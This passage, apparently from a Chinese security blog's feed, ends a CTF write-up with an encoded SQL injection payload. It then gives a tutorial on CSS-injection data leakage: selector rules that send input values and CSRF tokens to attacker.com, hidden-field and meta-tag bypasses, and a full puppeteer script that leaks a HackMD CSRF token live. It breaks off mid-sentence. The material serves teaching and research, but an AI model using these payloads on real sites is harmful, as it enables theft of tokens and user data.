6f6963336c7a64475674496a7439637a6f784d446f6941436f4162334230615739756379493759546f784f6e747a4f6a5936496e42795a575a7065434937637a6f324f694a715a577873655338694f33317a4f6a593649674171414852685a794937596a6f784f33317a4f6a6b364967417141474e76626d5a705a79493759546f794f6e747a4f6a5936496d563463476c795a534937637a6f774f6949694f334d364d544936496e4e6c63334e7062323566626d46745a534937637a6f774f6949694f333139665831396658303d%27)%2f**%2fwhere%2f**%2fid%3d1%23%26id%3d1%26data%3d1%0a</code></pre><p>使用 Brup Suite 拦截 POST &#x2F;public&#x2F;index.php&#x2F;index&#x2F;admin&#x2F;do_edit.html 修改数据<br>再次访问修改完成的商品获得 flag：</p><p><img src="image-6.png" alt="image-6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Java </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过 CSS Injection 实现信息泄露</title>
      <link href="/skill/%E9%80%9A%E8%BF%87-css-injection-%E5%AE%9E%E7%8E%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
      <url>/skill/%E9%80%9A%E8%BF%87-css-injection-%E5%AE%9E%E7%8E%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<p>CSS Injection 通过利用 <code>CSS Selectors</code> 匹配和选择页面元素的功能来实现页面信息的泄露</p><h2 id="1-基础用法"><a href="#1-基础用法" class="headerlink" title="1. 基础用法"></a>1. 基础用法</h2><p>假设此时 <code>target.com</code> 的目标靶机上存在以下内容</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>somevalue<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>如果想要得到 input 元素的 value，我们可以在 <code>target.com</code> 上加载如下 css ：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[value^=a]</span><span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">input[value^=b]</span><span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* ... */</span><span class="token selector">input[value^=9]</span><span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=9<span class="token punctuation">)</span></span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p><code>value^=X</code> 是一个 <code>CSS Selectors</code> 表达式，它将匹配所有目标类型中包含属性 value 且其值以前缀 <code>X</code> 开头的元素，同时使用目标样式渲染被选择的元素。</p><p>由于样式中指定了 <code>background-image: url()</code> ，这将触发页面对目标 url <code>attacker.com/?value=s</code> 的 HTTP 请求，此时我们通过在 <code>attacker.com</code> 上的请求日志就可以得知 value 以 <code>s</code> 开头，</p><p>然后我们重新加载 <code>target.com</code> ，但使用如下 CSS：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[value^=sa]</span><span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=sa<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">input[value^=sb]</span><span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=sb<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* ... */</span><span class="token selector">input[value^=s9]</span><span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=s9<span class="token punctuation">)</span></span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>这会导致页面请求 <code>attacker.com/?value=so</code>,<br>最终，在重复此模式几次后，最终请求 <code>attacker.com/?value=somevalue</code> 将允许我们了解目标页面中 input 元素的 value 属性值。</p><h2 id="2-减少规则数量"><a href="#2-减少规则数量" class="headerlink" title="2. 减少规则数量"></a>2. 减少规则数量</h2><p>由于 CSS Selectors 包含 <code>value*=X</code> 表达式，<br>可以匹配任何包含属性 value 且其值包含 <code>X</code> 字符的元素，<br>因此我们可以预先确定组成目标属性值的字符集，来减少获得目标属性值所需的规则数量。</p><p>例如，上面的样例中仅使用了字符“s,o,m,e,v,a,l,u,e”，<br>因此我们可以减少所需的规则数量至每个字符9个规则。</p><h2 id="3-加速泄露"><a href="#3-加速泄露" class="headerlink" title="3. 加速泄露"></a>3. 加速泄露</h2><p>如果目标信息过长，逐字元泄露的速度可能过慢，<br>事实上，我们可以一次泄露两个字元：<br>由于 CSS Selectors 不仅包含 prefix selector: <code>value^=X</code>，<br>还包含 suffix selector: <code>value$=X</code> 表达式，<br>因此我们可以这样来一次获取两个字元：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[name="secret"][value^="a"]</span> <span class="token punctuation">&#123;</span>  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=a<span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span class="token selector">input[name="secret"][value^="b"]</span> <span class="token punctuation">&#123;</span>  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=b<span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span class="token selector">// ...input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</span>  <span class="token property">border-background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver2.com/suffix?q=a<span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span class="token selector">input[name="secret"][value$="b"]</span> <span class="token punctuation">&#123;</span>  <span class="token property">border-background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver2.com/suffix?q=b<span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span></code></pre><p>注意此处前后缀选择器的两个属性需要分别使用 <code>background</code> 和 <code>border-background</code>，<br>因为如果使用同一属性，在多次匹配到相同元素样式时仅最后一个会生效并会被请求</p><h2 id="4-meta-标签-信息泄露"><a href="#4-meta-标签-信息泄露" class="headerlink" title="4. meta 标签 信息泄露"></a>4. meta 标签 信息泄露</h2><p>由于部分信息会被网站存储于 meta 标签中，<br>而 meta 标签在页面中往往是处于不可见的状态的，<br>大部分浏览器不会渲染不可见的 meta 标签，<br>因此它的样式的外部资源不会被浏览器检索，<br>使用常规的 <code>background-imageurl</code> 方法在 <code>attacker.com</code> 上不会收到任何请求，<br>但是我们可以通过 CSS 让这个元素变为可见状态：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">meta</span> <span class="token punctuation">&#123;</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token selector">meta[name="csrf-token"][content^="a"]</span> <span class="token punctuation">&#123;</span>  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>但是如果进行尝试，我们发现请求还是被没有送出，<br>这是因为 meta 在 head 底下，而 head 也有预设的 <code>display:none</code> 属性，<br>因此也要给 head 设置可见样式，才能让 meta 可见：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">head, meta</span> <span class="token punctuation">&#123;</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token selector">meta[name="csrf-token"][content^="a"]</span> <span class="token punctuation">&#123;</span>  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="5-绕过-type-hidden-属性限制"><a href="#5-绕过-type-hidden-属性限制" class="headerlink" title="5. 绕过 type&#x3D;hidden 属性限制"></a>5. 绕过 type&#x3D;hidden 属性限制</h2><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/action<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>abc123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>在以上示例中，由于 input 元素的 type 是 hidden，所以这个元素不会显示在页面上，<br>与 meta 标签一样，大部分浏览器不会渲染 type 为 hidden 的元素，<br>因此该元素样式的外部资源不会被浏览器检索，我们在 <code>attacker.com</code> 上也就不会收到任何请求。<br>而这个限制非常严格，就算用 <code>display:block !important;</code> 也没办法覆盖</p><p>这个问题可以通过 CSS 中的 相邻同级组合器 （+）和 通用同级组合器（~）来解决</p><h3 id="5-1-CSS-相邻同级组合器（-）"><a href="#5-1-CSS-相邻同级组合器（-）" class="headerlink" title="5.1 CSS 相邻同级组合器（+）"></a>5.1 CSS 相邻同级组合器（+）</h3><blockquote><p>相邻同级组合器选择器允许您选择紧跟在一个特定元素之后的元素。</p></blockquote><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p + p</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">/* 选择一个段落之后的同级且继承于它的所有段落 */</span></code></pre><p><img src="image-1.png" alt="image-1.png"></p><h3 id="5-2-CSS-通用同级组合器（-）"><a href="#5-2-CSS-通用同级组合器（-）" class="headerlink" title="5.2 CSS 通用同级组合器（~）"></a>5.2 CSS 通用同级组合器（~）</h3><blockquote><p>通用同级运算器选择器与刚才的相邻同级运算器选择器非常相似。<br>不同之处在于，被选中的元素不需要立即继承第一个元素，而是可以出现在它之后的任何位置。</p></blockquote><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p ~ p</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">/* 选择一个段落之后同级的所有段落 */</span></code></pre><p>如果我们使用与上面相同的示例结构，最后一个 <code>&lt;p&gt;</code>元素也将由 p ~ p 选择，因为它前面是另一个 <code>&lt;p&gt;</code> 元素，即使不是直接的。</p><p><img src="image-2.png" alt="image-2.png"></p><p>利用 相邻同级组合器 （+）和 通用组合运算器（~），<br>我们可以渲染与  <code>input[type=hidden]</code> 同级的其他没有 <code>type=hidden</code> 属性的 input 元素，<br>来实现通过 <code>background-imageurl</code> 的信息泄露，从而绕过 <code>type=hidden</code> 限制</p><h3 id="5-3-CSS-has-选择器"><a href="#5-3-CSS-has-选择器" class="headerlink" title="5.3 CSS :has 选择器"></a>5.3 CSS :has 选择器</h3><p>不难发现，相邻同级组合器和通用同级组合器只能在目标 <code>type=hidden</code> 的元素之后存在没有 <code>type=hidden</code> 标记的同级元素时才能实现信息泄露，<br>而如果目标元素之后不存在满足条件的同级元素时，我们则需要使用 :has 选择器来实现信息泄露</p><blockquote><p>:has 选择器 可以选择包含特定内容的元素。<br>例如，<code>a:has(img)</code>可以选择所有包含子元素<code>&lt;img&gt;</code>的<code>&lt;a&gt;</code>元素。</p></blockquote><p>因此，我们可以利用以下 CSS：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">form:has(input[name="csrf-token"][value^="a"])</span><span class="token punctuation">&#123;</span>  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span></code></pre><p>该 CSS 将选中包含符合条件的 input 的 form ，并将其渲染为对应样式，<br>由于被渲染的元素为 <code>form</code> ，故可以绕过 input 的 hidden 属性来实现信息泄露</p><h2 id="6-实时更新-Style-信息泄露"><a href="#6-实时更新-Style-信息泄露" class="headerlink" title="6. 实时更新 Style 信息泄露"></a>6. 实时更新 Style 信息泄露</h2><p>在上述示例中，如果目标信息在页面重新加载后更新会重置，<br>我们将只能使用 CSS 获取目标信息的第一个字元。</p><p>而在以下示例 HackMD 中 CSRF token 在重新加载后会更新，<br>而示例 HackMD 支持 Style 样式的实时更新，<br>也就是说，只要内容变了，会立刻反映在其他 client 的画面上，<br>因此可以做到不重新加载而实时更新style。</p><h3 id="6-1-步骤"><a href="#6-1-步骤" class="headerlink" title="6.1 步骤"></a>6.1 步骤</h3><ol><li>准备好泄露第一个字元的 CSS Payload，插入到 HackMD 里</li><li>受害者打开页面</li><li>服务器收到泄露第一个字元的请求</li><li>从服务器更新 HackMD 内容，换成泄露第二个字元的 Payload</li><li>受害者页面即时更新，载入新的 Style</li><li>服务器收到第二个字元的请求</li><li>不断循环直到整个目标信息被泄露</li></ol><p><img src="image-3.png" alt="image-3.png"></p><h3 id="6-2-Payload"><a href="#6-2-Payload" class="headerlink" title="6.2 Payload"></a>6.2 Payload</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'puppeteer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Create a hackMD document and let anyone can view/edit</span><span class="token keyword">const</span> noteUrl <span class="token operator">=</span> <span class="token string">'https://hackmd.io/1awd-Hg82fekACbL_ode3aasf'</span><span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token string">'http://localhost:3000'</span><span class="token keyword">const</span> baseUrl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">'/extract?q='</span><span class="token keyword">const</span> port <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token boolean">true</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setViewport</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">width</span><span class="token operator">:</span> <span class="token number">1280</span><span class="token punctuation">,</span> <span class="token literal-property property">height</span><span class="token operator">:</span> <span class="token number">800</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setRequestInterception</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  page<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token parameter">request</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// cancel request to self</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>baseUrl<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      request<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      request<span class="token punctuation">.</span><span class="token function">continue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Listening at http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Waiting for server to get ready...'</span><span class="token punctuation">)</span>    <span class="token function">startExploit</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> page<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">startExploit</span><span class="token punctuation">(</span><span class="token parameter">app<span class="token punctuation">,</span> page</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> currentToken <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>noteUrl <span class="token operator">+</span> <span class="token string">'?edit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">addStyleTag</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">"&#123;scroll-behavior: auto !important;&#125;"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> initialPayload <span class="token operator">=</span> <span class="token function">generateCss</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> <span class="token function">updateCssPayload</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> initialPayload<span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server is ready, you can open </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>noteUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">?view on the browser</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/extract'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> query <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>query<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">query: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>query<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, progress: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>query<span class="token punctuation">.</span>length<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/36</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    currentToken <span class="token operator">=</span> query    <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'over'</span><span class="token punctuation">)</span>      <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token function">generateCss</span><span class="token punctuation">(</span>currentToken<span class="token punctuation">)</span>    <span class="token function">updateCssPayload</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">updateCssPayload</span><span class="token punctuation">(</span><span class="token parameter">page<span class="token punctuation">,</span> payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">'.CodeMirror-line'</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">down</span><span class="token punctuation">(</span><span class="token string">'Meta'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">press</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">up</span><span class="token punctuation">(</span><span class="token string">'Meta'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">press</span><span class="token punctuation">(</span><span class="token string">'Backspace'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">sendCharacter</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Updated css payload, waiting for next request'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">generateCss</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> csrfTokenChars <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>prefix<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;style>    head, meta &#123;        display: block;    &#125;    </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>      csrfTokenChars<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">char</span> <span class="token operator">=></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        meta[name="csrf-token"][content^="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>prefix <span class="token operator">+</span> char<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"] &#123;            background: url(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>baseUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>prefix <span class="token operator">+</span> char<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)        &#125;      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/style>  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span></code></pre><h2 id="7-import-递归导入"><a href="#7-import-递归导入" class="headerlink" title="7. @import 递归导入"></a>7. @import 递归导入</h2><p>完成上述 CSS Injection 通常需要满足以下先决条件：</p><ol><li>CSS 注入需要允许足够长的有效负载</li><li>能够构建页面以触发新生成的有效负载的 CSS 重新评估</li><li>能够使用外部托管的图像（可能被 CSP 阻止）</li></ol><p>这意味着如果注入不允许足够大小的有效负载或者页面无法构建，则上述的技术可能不适用。</p><p>在这种情况下需要一种让浏览器无需重新加载iframe 或额外的用户交互，即可重新评估多个 CSS 有效负载，而且还需要能绕过可以注入的有效负载的长度限制的方法。</p><p>仅使用标签来利用这一点似乎不太可能，因此考虑有趣的CSS功能：<code>@import</code></p><h3 id="7-1-import-用法"><a href="#7-1-import-用法" class="headerlink" title="7.1 @import 用法"></a>7.1 @import 用法</h3><p>许多编程语言都能够从其他源文件导入代码，CSS 也不例外。<br>虽然许多人可能只知道 <code>&lt;link href=&quot;...&quot; rel=&quot;stylesheet&quot;&gt;</code> ，<br>但 CSS 本身实际上有一种方法可以使用名为 <code>@import</code> 的规则，<br>执行类似 <code>&lt;link&gt;</code>（但不同）类型的样式表包含。</p><h3 id="7-2-递归导入的先决条件"><a href="#7-2-递归导入的先决条件" class="headerlink" title="7.2 递归导入的先决条件"></a>7.2 递归导入的先决条件</h3><p>要完成使用 @import 的递归导入，需要满足以下先决条件：</p><ol><li>在样式标记的开头拥有控制权（HTML 注入通常拥有此控制权）</li><li>页面 CSP 没有阻止外部 <code>style-src</code> url 的使用</li></ol><h3 id="7-3-递归导入原理"><a href="#7-3-递归导入原理" class="headerlink" title="7.3 递归导入原理"></a>7.3 递归导入原理</h3><p>我们需要浏览器评估一次恶意 css，使用下一个获得到的<code>token</code>发送出站请求，然后重复。<br>显然，“重复”部分通常是使用全帧重新加载（iframe，或选项卡等等）来完成的。<br>然而，我们实际上并不需要重新加载框架来让浏览器重新评估新的CSS。</p><p>@import 递归导入 使用 3 个简单步骤来欺骗某些浏览器执行多次评估：</p><ol><li>将 <code>@import</code> 规则注入暂存负载</li><li>暂存有效负载用于 <code>@import</code> 